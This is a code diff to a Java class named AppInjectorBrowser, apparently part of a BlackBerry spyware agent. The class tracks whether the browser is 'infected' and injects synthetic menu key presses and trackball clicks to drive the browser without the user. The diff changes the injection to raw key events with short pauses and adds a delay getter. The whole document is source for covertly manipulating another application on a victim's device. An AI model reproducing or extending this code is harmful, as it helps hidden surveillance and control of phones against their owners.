@@ -18,6 +18,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
+    private static final int DELAY = 3000;
 
     boolean infected;
 
@@ -49,28 +50,18 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         return true;
     }
 
-    public boolean callMenuByKey(int type) {
+    public boolean callMenuByKey() {
 
         //#ifdef DEBUG
         debug.info("calling browser menu");
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        //KeyInjector.pressKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(500);
+        Utils.sleep(100);
+        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        Utils.sleep(100);
+        KeyInjector.trackBallRawClick();
 
-        //if(Device.getInstance().hasAdvancedClick){
-        KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
-        //KeyInjector.pressRawKey(menu.toString().charAt(0));
-        //KeyInjector.pressRawKeyCode(menu.toString().charAt(0));
-        //KeyInjector.pressKeyCode(menu.toString().charAt(0));
-        Utils.sleep(500);
-        KeyInjector.trackBallClick();
-        //}else{
-        //   KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        //   Utils.sleep(500);
-        //   KeyInjector.trackBallRawClick();
-        //}
         return true;
     }
 
@@ -89,6 +80,11 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     public void setInfected() {
         infected = true;
+    }
+
+    public int getDelay() {
+       
+        return DELAY;
     }
 
 }
